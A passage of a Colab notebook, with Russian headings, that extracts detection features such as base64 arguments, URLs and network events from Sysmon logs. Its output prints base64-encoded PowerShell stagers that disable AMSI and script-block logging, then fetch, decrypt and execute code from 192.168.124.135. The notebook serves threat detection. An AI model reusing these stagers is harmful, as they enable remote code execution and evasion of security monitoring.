gBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwBZAFMAdABlAE0ALgBUAEUAWABUAC4ARQBOAGMAbwBEAGkATgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQBUAEIAWQB0AGUAUwAoACcARAAqADEAQQA1ADsASwBmAHQAXgB7AHMASgA4AGwAQABSAF8APABaAG4ASQBkADcAPgB+AEIANgBFAFMAbwBlACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIAZwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAFUAbgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAWABPAHIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAHIAPQAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAMgA0AC4AMQAzADUAOgA4ADAAOAAwACcAOwAkAHQAPQAnAC8AbABvAGcAaQBuAC8AcAByAG8AYwBlAHMAcwAuAHAAaABwACcAOwAkAHcAQwAuAEgAZQBhAGQAZQBSAFMALgBBAEQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIAcwBlAHMAcwBpAG8AbgA9AFMATQBMAFgAVwBRAGIAaQBFADMAWgAvAE4ARABHAHEATAB1ADgAVAA5AEUAdABCAHIARABRAD0AIgApADsAJABEAEEAdABhAD0AJABXAEMALgBEAE8AVwBuAGwAbwBBAEQARABhAFQAQQAoACQAUwBFAHIAKwAkAHQAKQA7ACQASQBWAD0AJABEAGEAVABBAFsAMAAuAC4AMwBdADsAJABkAGEAdABBAD0AJABkAEEAdABBAFsANAAuAC4AJABkAEEAVABhAC4AbABFAE4AZwB0AEgAXQA7AC0AagBvAGkAbgBbAEMAaABhAFIAWwBdAF0AKAAmACAAJABSACAAJABEAEEAVABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA= \n",
            "\n",
            "-noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBlAHIAUwBpAE8ATgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBJAG8ATgAuAE0AQQBqAG8AUgAgAC0ARwBlACAAMwApAHsAJABHAFAARgA9AFsAcgBFAGYAXQAuAEEAUwBTAEUATQBiAEwAeQAuAEcARQBUAFQAWQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAEkAZQBgAEwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAEUAdABWAGEATABVAGUAKAAkAG4AVQBMAEwAKQA7AEkARgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAHYAQQBMAD0AWwBDAG8ATABMAGUAQwB0AGkAbwBOAHMALgBHAGUAbgBlAFIASQBDAC4ARABJAEMAVABpAG8AbgBhAHIAWQBbAFMAVAByAGkAbgBnACwAUwB5AFMAVABlAE0ALgBPAGIASgBlAEMAVABdAF0AOgA6AE4AZQB3ACgAKQA7ACQAVgBhAGwALgBBAGQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAVgBBAEwALgBBAEQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAGEAbAB9AEUAbABzAEUAewBbAFMAYwByAGkAUAB0AEIATABPAGMASwBdAC4AIgBHAGUAdABGAGkARQBgAEwAZAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBFAHQAVgBBAEwAdQBlACgAJABuAFUATABsACwAKABOAGUAVwAtAE8AYgBqAGUAYwBUACAAQwBvAEwAbABFAEMAdABpAE8AbgBzAC4ARwBlAG4AZQBSAEkAYwAuAEgAYQBTAGgAUwBlAHQAWwBzAHQAcgBpAE4ARwBdACkAKQB9AFsAUgBlAGYAXQAuAEEAUwBzAEUATQBiAGwAWQAuAEcAZQBUAFQAeQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAfAA/AHsAJABfAH0AfAAlAHsAJABfAC4ARwBFAFQARgBJAGUATABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEATAB1AEUAKAAkAG4AVQBMAEwALAAkAFQAUgB1AGUAKQB9ADsAfQA7AFsAUwB5AFMAVABFAG0ALgBOAEUAdAAuAFMAZQByAFYASQBjAEUAUABvAGkAbgB0AE0AQQBOAGEARwBFAFIAXQA6ADoARQBYAHAAZQBDAHQAMQAwADAAQwBvAE4AVABpAG4AdQBFAD0AMAA7ACQAdwBDAD0ATgBlAHcALQBPAGIASgBlAGMAVAAgAFMAeQBzAFQARQBtAC4ATgBFAHQALgBXAEUAQgBDAGwASQBFAE4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAFcAYwAuAEgAZQBBAGQAZQBSAFMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAQwAuAFAAcgBPAFgAWQA9AFsAUwBZAHMAVABFAE0ALgBOAEUAdAAuAFcAZQBiAFIAZQBRAHUAZQBzAFQAXQA6ADoARABlAGYAYQBVAGwAVABXAGUAQgBQAHIATwB4AFkAOwAkAHcAQwAuAFAAcgBvAHgAWQAuAEMAUgBlAGQAZQBuAFQASQBBAGwAUwAgAD0AIABbAFMAWQBzAFQARQBtAC4ATgBFAFQALgBDAFIAZQBkAEUATgB0AGkAYQBsAEMAQQBjAEgAZQBdADoAOgBEAEUARgBBAFUAbABUAE4AZQBUAHcAbwByAEsAQwByAGUARABFAE4AVABpAGEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwBZAHMAVABlAE0ALgBUAEUAeABUAC4ARQBuAEMAbwBkAGkATgBHAF0AOgA6AEEAUwBDAEkASQAuAEcARQBUAEIAeQB0AEUAcwAoACcARAAqADEAQQA1ADsASwBmAHQAXgB7AHMASgA4AGwAQABSAF8APABaAG4ASQBkADcAPgB+AEIANgBFAFMAbwBlACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIARwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAFUAbgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABPAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAHIAPQAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAMgA0AC4AMQAzADUAOgA4ADAAOAAwACcAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJABXAEMALgBIAEUAQQBEAGUAcgBzAC4AQQBkAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAHMAZQBzAHMAaQBvAG4APQBqAHMAagBkAG0AMABoAE4AagBIAHgAYgBaAEcASABrAGEAeQBpACsAcgBOAFkAYwBKAFYAcwA9ACIAKQA7ACQARABhAHQAQQA9ACQAVwBDAC4ARABvAFcATgBsAG8AQQBEAEQAYQBUAGEAKAAkAHMARQByACsAJABUACkAOwAkAGkAdgA9ACQAZABhAFQAQQBbADAALgAuADMAXQA7ACQARABBAFQAYQA9ACQAZABhAFQAQQBbADQALgAuACQARABBAHQAQQAuAEwARQBOAGcAVABoAF0AOwAtAEoAbwBpAE4AWwBDAGgAQQByAFsAXQBdACgAJgAgACQAUgAgACQAZABBAHQAQQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA \n",
            "\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "b64s = newdf['arguments'].apply(lambda x: re.search(b64_regex, x)).notnull()\n",
        "newdf['b64'] = b64s.astype(int)"
      ],
      "metadata": {
        "id": "3197zC-afXu2"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "4. URL / UNC"
      ],
      "metadata": {
        "id": "VEWIpdqSfmAU"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "unc_regex = r\"\\\\\\\\[a-zA-Z0-9]+\\\\[a-zA-Z0-9\\\\]+\\.\"\n",
        "uncs = newdf['arguments'][newdf['arguments'].apply(lambda x: re.search(unc_regex, x)).notnull()]\n",
        "uncs[uncs].index"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "L3TuaQfFflwv",
        "outputId": "d3781e69-69ba-48d8-aa8b-1a2399fbb46e"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "Int64Index([], dtype='int64')"
            ]
          },
          "metadata": {},
          "execution_count": 67
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "test = r\"rundll \\\\test\\test\\r.dll\"\n",
        "re.search(unc_regex, test)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "ZDXcjy3yfjkz",
        "outputId": "33c45d28-6b8d-4e8f-d020-b880cef7b80a"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "<re.Match object; span=(7, 21), match='\\\\\\\\test\\\\test\\\\r.'>"
            ]
          },
          "metadata": {},
          "execution_count": 68
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "url_regex = r\"https?:\\/\\/(www\\.)?[-a-zA-Z0-9@:%._\\+~#=]{1,256}\\.[a-zA-Z0-9()]{1,6}\\b([-a-zA-Z0-9()@:%_\\+.~#?&//=]*)\"\n",
        "urls = newdf['arguments'].apply(lambda x: re.search(url_regex, x)).notnull()\n",
        "urls[urls]"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "quNlCfZFfy9s",
        "outputId": "7124dc3b-e667-4965-ef41-99d258abee1e"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "3507    True\n",
              "Name: arguments, dtype: bool"
            ]
          },
          "metadata": {},
          "execution_count": 69
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "newdf['arguments'][3507]"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 35
        },
        "id": "_g432QG9f2Lz",
        "outputId": "8082d6bf-af44-4d57-ad2f-5ec2e1655879"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "'-IOAVHost 2781761e-28e0-4109-99fe-b9d127c57afe|C:\\\\Users\\\\anon\\\\Downloads\\\\quarterly_results.docm.vbs|http://192.168.124.135/quarterly_results.docm.vbs'"
            ],
            "application/vnd.google.colaboratory.intrinsic+json": {
              "type": "string"
            }
          },
          "metadata": {},
          "execution_count": 70
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "newdf['unc_url'] = pd.concat([uncs, urls]).astype(int)"
      ],
      "metadata": {
        "id": "Fp8UkuTtf8uA"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "newdf[newdf['unc_url'].astype(bool)]"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 232
        },
        "id": "vUWs9dXKgBJE",
        "outputId": "c0f12714-1fe7-4b80-82fc-701b4dd8a7b6"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "      Unnamed: 0                  UtcTime  ProcessId  EventID  \\\n",
              "3507        3567  2020-05-12 14:53:21.922       9444        1   \n",
              "\n",
              "                      User                                   Image  \\\n",
              "3507  DESKTOP-TATBGQH\\anon  C:\\Windows\\System32\\browser_broker.exe   \n",
              "\n",
              "     ImageLoaded                                        CommandLine  \\\n",
              "3507         NaN  C:\\Windows\\system32\\browser_broker.exe -IOAVHo...   \n",
              "\n",
              "                                 ParentImage  \\\n",
              "3507  C:\\Windows\\System32\\browser_broker.exe   \n",
              "\n",
              "                                      ParentCommandLine  DestinationPort  \\\n",
              "3507  C:\\Windows\\system32\\browser_broker.exe -Embedding              NaN   \n",
              "\n",
              "     Protocol QueryName TargetFilename TargetObject              binary  \\\n",
              "3507      NaN       NaN            NaN          NaN  browser_broker.exe   \n",
              "\n",
              "                     path                                          arguments  \\\n",
              "3507  c:\\windows\\system32  -IOAVHost 2781761e-28e0-4109-99fe-b9d127c57afe...   \n",
              "\n",
              "      b64  unc_url  \n",
              "3507    0        1  "
            ],
            "text/html": [
              "\n",
              "\n",
              "  <div id=\"df-359707e4-a531-4ef7-81d8-935314a9a12e\">\n",
              "    <div class=\"colab-df-container\">\n",
              "      <div>\n",
              "<style scoped>\n",
              "    .dataframe tbody tr th:only-of-type {\n",
              "        vertical-align: middle;\n",
              "    }\n",
              "\n",
              "    .dataframe tbody tr th {\n",
              "        vertical-align: top;\n",
              "    }\n",
              "\n",
              "    .dataframe thead th {\n",
              "        text-align: right;\n",
              "    }\n",
              "</style>\n",
              "<table border=\"1\" class=\"dataframe\">\n",
              "  <thead>\n",
              "    <tr style=\"text-align: right;\">\n",
              "      <th></th>\n",
              "      <th>Unnamed: 0</th>\n",
              "      <th>UtcTime</th>\n",
              "      <th>ProcessId</th>\n",
              "      <th>EventID</th>\n",
              "      <th>User</th>\n",
              "      <th>Image</th>\n",
              "      <th>ImageLoaded</th>\n",
              "      <th>CommandLine</th>\n",
              "      <th>ParentImage</th>\n",
              "      <th>ParentCommandLine</th>\n",
              "      <th>DestinationPort</th>\n",
              "      <th>Protocol</th>\n",
              "      <th>QueryName</th>\n",
              "      <th>TargetFilename</th>\n",
              "      <th>TargetObject</th>\n",
              "      <th>binary</th>\n",
              "      <th>path</th>\n",
              "      <th>arguments</th>\n",
              "      <th>b64</th>\n",
              "      <th>unc_url</th>\n",
              "    </tr>\n",
              "  </thead>\n",
              "  <tbody>\n",
              "    <tr>\n",
              "      <th>3507</th>\n",
              "      <td>3567</td>\n",
              "      <td>2020-05-12 14:53:21.922</td>\n",
              "      <td>9444</td>\n",
              "      <td>1</td>\n",
              "      <td>DESKTOP-TATBGQH\\anon</td>\n",
              "      <td>C:\\Windows\\System32\\browser_broker.exe</td>\n",
              "      <td>NaN</td>\n",
              "      <td>C:\\Windows\\system32\\browser_broker.exe -IOAVHo...</td>\n",
              "      <td>C:\\Windows\\System32\\browser_broker.exe</td>\n",
              "      <td>C:\\Windows\\system32\\browser_broker.exe -Embedding</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>browser_broker.exe</td>\n",
              "      <td>c:\\windows\\system32</td>\n",
              "      <td>-IOAVHost 2781761e-28e0-4109-99fe-b9d127c57afe...</td>\n",
              "      <td>0</td>\n",
              "      <td>1</td>\n",
              "    </tr>\n",
              "  </tbody>\n",
              "</table>\n",
              "</div>\n",
              "      <button class=\"colab-df-convert\" onclick=\"convertToInteractive('df-359707e4-a531-4ef7-81d8-935314a9a12e')\"\n",
              "              title=\"Convert this dataframe to an interactive table.\"\n",
              "              style=\"display:none;\">\n",
              "\n",
              "  <svg xmlns=\"http://www.w3.org/2000/svg\" height=\"24px\"viewBox=\"0 0 24 24\"\n",
              "       width=\"24px\">\n",
              "    <path d=\"M0 0h24v24H0V0z\" fill=\"none\"/>\n",
              "    <path d=\"M18.56 5.44l.94 2.06.94-2.06 2.06-.94-2.06-.94-.94-2.06-.94 2.06-2.06.94zm-11 1L8.5 8.5l.94-2.06 2.06-.94-2.06-.94L8.5 2.5l-.94 2.06-2.06.94zm10 10l.94 2.06.94-2.06 2.06-.94-2.06-.94-.94-2.06-.94 2.06-2.06.94z\"/><path d=\"M17.41 7.96l-1.37-1.37c-.4-.4-.92-.59-1.43-.59-.52 0-1.04.2-1.43.59L10.3 9.45l-7.72 7.72c-.78.78-.78 2.05 0 2.83L4 21.41c.39.39.9.59 1.41.59.51 0 1.02-.2 1.41-.59l7.78-7.78 2.81-2.81c.8-.78.8-2.07 0-2.86zM5.41 20L4 18.59l7.72-7.72 1.47 1.35L5.41 20z\"/>\n",
              "  </svg>\n",
              "      </button>\n",
              "\n",
              "\n",
              "\n",
              "    <div id=\"df-6a3403f9-7c43-483e-a07a-fc3e118ba318\">\n",
              "      <button class=\"colab-df-quickchart\" onclick=\"quickchart('df-6a3403f9-7c43-483e-a07a-fc3e118ba318')\"\n",
              "              title=\"Suggest charts.\"\n",
              "              style=\"display:none;\">\n",
              "\n",
              "<svg xmlns=\"http://www.w3.org/2000/svg\" height=\"24px\"viewBox=\"0 0 24 24\"\n",
              "     width=\"24px\">\n",
              "    <g>\n",
              "        <path d=\"M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zM9 17H7v-7h2v7zm4 0h-2V7h2v10zm4 0h-2v-4h2v4z\"/>\n",
              "    </g>\n",
              "</svg>\n",
              "      </button>\n",
              "    </div>\n",
              "\n",
              "<style>\n",
              "  .colab-df-quickchart {\n",
              "    background-color: #E8F0FE;\n",
              "    border: none;\n",
              "    border-radius: 50%;\n",
              "    cursor: pointer;\n",
              "    display: none;\n",
              "    fill: #1967D2;\n",
              "    height: 32px;\n",
              "    padding: 0 0 0 0;\n",
              "    width: 32px;\n",
              "  }\n",
              "\n",
              "  .colab-df-quickchart:hover {\n",
              "    background-color: #E2EBFA;\n",
              "    box-shadow: 0px 1px 2px rgba(60, 64, 67, 0.3), 0px 1px 3px 1px rgba(60, 64, 67, 0.15);\n",
              "    fill: #174EA6;\n",
              "  }\n",
              "\n",
              "  [theme=dark] .colab-df-quickchart {\n",
              "    background-color: #3B4455;\n",
              "    fill: #D2E3FC;\n",
              "  }\n",
              "\n",
              "  [theme=dark] .colab-df-quickchart:hover {\n",
              "    background-color: #434B5C;\n",
              "    box-shadow: 0px 1px 3px 1px rgba(0, 0, 0, 0.15);\n",
              "    filter: drop-shadow(0px 1px 2px rgba(0, 0, 0, 0.3));\n",
              "    fill: #FFFFFF;\n",
              "  }\n",
              "</style>\n",
              "\n",
              "    <script>\n",
              "      async function quickchart(key) {\n",
              "        const containerElement = document.querySelector('#' + key);\n",
              "        const charts = await google.colab.kernel.invokeFunction(\n",
              "            'suggestCharts', [key], {});\n",
              "      }\n",
              "    </script>\n",
              "\n",
              "      <script>\n",
              "\n",
              "function displayQuickchartButton(domScope) {\n",
              "  let quickchartButtonEl =\n",
              "    domScope.querySelector('#df-6a3403f9-7c43-483e-a07a-fc3e118ba318 button.colab-df-quickchart');\n",
              "  quickchartButtonEl.style.display =\n",
              "    google.colab.kernel.accessAllowed ? 'block' : 'none';\n",
              "}\n",
              "\n",
              "        displayQuickchartButton(document);\n",
              "      </script>\n",
              "      <style>\n",
              "    .colab-df-container {\n",
              "      display:flex;\n",
              "      flex-wrap:wrap;\n",
              "      gap: 12px;\n",
              "    }\n",
              "\n",
              "    .colab-df-convert {\n",
              "      background-color: #E8F0FE;\n",
              "      border: none;\n",
              "      border-radius: 50%;\n",
              "      cursor: pointer;\n",
              "      display: none;\n",
              "      fill: #1967D2;\n",
              "      height: 32px;\n",
              "      padding: 0 0 0 0;\n",
              "      width: 32px;\n",
              "    }\n",
              "\n",
              "    .colab-df-convert:hover {\n",
              "      background-color: #E2EBFA;\n",
              "      box-shadow: 0px 1px 2px rgba(60, 64, 67, 0.3), 0px 1px 3px 1px rgba(60, 64, 67, 0.15);\n",
              "      fill: #174EA6;\n",
              "    }\n",
              "\n",
              "    [theme=dark] .colab-df-convert {\n",
              "      background-color: #3B4455;\n",
              "      fill: #D2E3FC;\n",
              "    }\n",
              "\n",
              "    [theme=dark] .colab-df-convert:hover {\n",
              "      background-color: #434B5C;\n",
              "      box-shadow: 0px 1px 3px 1px rgba(0, 0, 0, 0.15);\n",
              "      filter: drop-shadow(0px 1px 2px rgba(0, 0, 0, 0.3));\n",
              "      fill: #FFFFFF;\n",
              "    }\n",
              "  </style>\n",
              "\n",
              "      <script>\n",
              "        const buttonEl =\n",
              "          document.querySelector('#df-359707e4-a531-4ef7-81d8-935314a9a12e button.colab-df-convert');\n",
              "        buttonEl.style.display =\n",
              "          google.colab.kernel.accessAllowed ? 'block' : 'none';\n",
              "\n",
              "        async function convertToInteractive(key) {\n",
              "          const element = document.querySelector('#df-359707e4-a531-4ef7-81d8-935314a9a12e');\n",
              "          const dataTable =\n",
              "            await google.colab.kernel.invokeFunction('convertToInteractive',\n",
              "                                                     [key], {});\n",
              "          if (!dataTable) return;\n",
              "\n",
              "          const docLinkHtml = 'Like what you see? Visit the ' +\n",
              "            '<a target=\"_blank\" href=https://colab.research.google.com/notebooks/data_table.ipynb>data table notebook</a>'\n",
              "            + ' to learn more about interactive tables.';\n",
              "          element.innerHTML = '';\n",
              "          dataTable['output_type'] = 'display_data';\n",
              "          await google.colab.output.renderOutput(dataTable, element);\n",
              "          const docLink = document.createElement('div');\n",
              "          docLink.innerHTML = docLinkHtml;\n",
              "          element.appendChild(docLink);\n",
              "        }\n",
              "      </script>\n",
              "    </div>\n",
              "  </div>\n"
            ]
          },
          "metadata": {},
          "execution_count": 72
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "5.  Сетевые обращения?"
      ],
      "metadata": {
        "id": "8HH2XQ-ngLC9"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "newdf['network'] = newdf['Protocol'].notnull().astype(int)\n"
      ],
      "metadata": {
        "id": "R7vciuOXgJL0"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "**Объединяем в новый DataFrame**"
      ],
      "metadata": {
        "id": "vDVjbxhZM7K1"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "newdf = newdf[['ProcessId','binary','EventID','path', 'unc_url', 'b64', 'network']]\n",
        "newdf['EventID'] = newdf['EventID'].astype('int8')\n",
        "newdf.head()"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 310
        },
        "id": "kwUym4lggTma",
        "outputId": "92222a74-28b8-4914-bfb3-996243f92407"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "<ipython-input-74-c370b2c67227>:2: SettingWithCopyWarning: \n",
            "A value is trying to be set on a copy of a slice from a DataFrame.\n",
            "Try using .loc[row_indexer,col_indexer] = value instead\n",
            "\n",
            "See the caveats in the documentation: https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#returning-a-view-versus-a-copy\n",
            "  newdf['EventID'] = newdf['EventID'].astype('int8')\n"
          ]
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "   ProcessId          binary  EventID  \\\n",
              "0       5380    explorer.exe        7   \n",
              "1       5380    explorer.exe       11   \n",
              "2       5080         mmc.exe       11   \n",
              "3       1520  powershell.exe        3   \n",
              "4          4          system        3   \n",
              "\n",
              "                                         path  unc_url  b64  network  \n",
              "0                                  c:\\windows        0    0        0  \n",
              "1                                  c:\\windows        0    0        0  \n",
              "2                         c:\\windows\\system32        0    0        0  \n",
              "3  c:\\windows\\system32\\windowspowershell\\v1.0        0    0        1  \n",
              "4                                                    0    0        1  "
            ],
            "text/html": [
              "\n",
              "\n",
              "  <div id=\"df-3a3ada38-8bae-4d71-a182-90baf4e2d49d\">\n",
              "    <div class=\"colab-df-container\">\n",
              "      <div>\n",
              "<style scoped>\n",
              "    .dataframe tbody tr th:only-of-type {\n",
              "        vertical-align: middle;\n",
              "    }\n",
              "\n",
              "    .dataframe tbody tr th {\n",
              "        vertical-align: top;\n",
              "    }\n",
              "\n",
              "    .dataframe thead th {\n",
              "        text-align: right;\n",
              "    }\n",
              "</style>\n",
              "<table border=\"1\" class=\"dataframe\">\n",
              "  <thead>\n",
              "    <tr style=\"text-align: right;\">\n",
              "      <th></th>\n",
              "      <th>ProcessId</th>\n",
              "      <th>binary</th>\n",
              "      <th>EventID</th>\n",
              "      <th>path</th>\n",
              "      <th>unc_url</th>\n",
              "      <th>b64</th>\n",
              "      <th>network</th>\n",
              "    </tr>\n",
              "  </thead>\n",
              "  <tbody>\n",
              "    <tr>\n",
              "      <th>0</th>\n",
              "      <td>5380</td>\n",
              "      <td>explorer.exe</td>\n",
              "      <td>7</td>\n",
              "      <td>c:\\windows</td>\n",
              "      <td>0</td>\n",
              "      <td>0</td>\n",
              "      <td>0</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>1</th>\n",
              "      <td>5380</td>\n",
              "      <td>explorer.exe</td>\n",
              "      <td>11</td>\n",
              "      <td>c:\\windows</td>\n",
              "      <td>0</td>\n",
              "      <td>0</td>\n",
              "      <td>0</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>2</th>\n",
              "      <td>5080</td>\n",
              "      <td>mmc.exe</td>\n",
              "      <td>11</td>\n",
              "      <td>c:\\windows\\system32</td>\n",
              "      <td>0</td>\n",
              "      <td>0</td>\n",
              "      <td>0</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3</th>\n",
              "      <td>1520</td>\n",
              "      <td>powershell.exe</td>\n",
              "      <td>3</td>\n",
              "      <td>c:\\windows\\system32\\windowspowershell\\v1.0</td>\n",
              "      <td>0</td>\n",
              "      <td>0</td>\n",
              "      <td>1</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>4</th>\n",
              "      <td>4</td>\n",
              "      <td>system</td>\n",
              "      <td>3</td>\n",
              "      <td></td>\n",
              "      <td>0</td>\n",
              "      <td>0</td>\n",
              "      <td>1</td>\n",
              "    </tr>\n",
              "  </tbody>\n",
              "</table>\n",
              "</div>\n",
              "      <button class=\"colab-df-convert\" onclick=\"convertToInteractive('df-3a3ada38-8bae-4d71-a182-90baf4e2d49d')\"\n",
              "              title=\"Convert this dataframe to an interactive table.\"\n",
              "              style=\"display:none;\">\n",
              "\n",
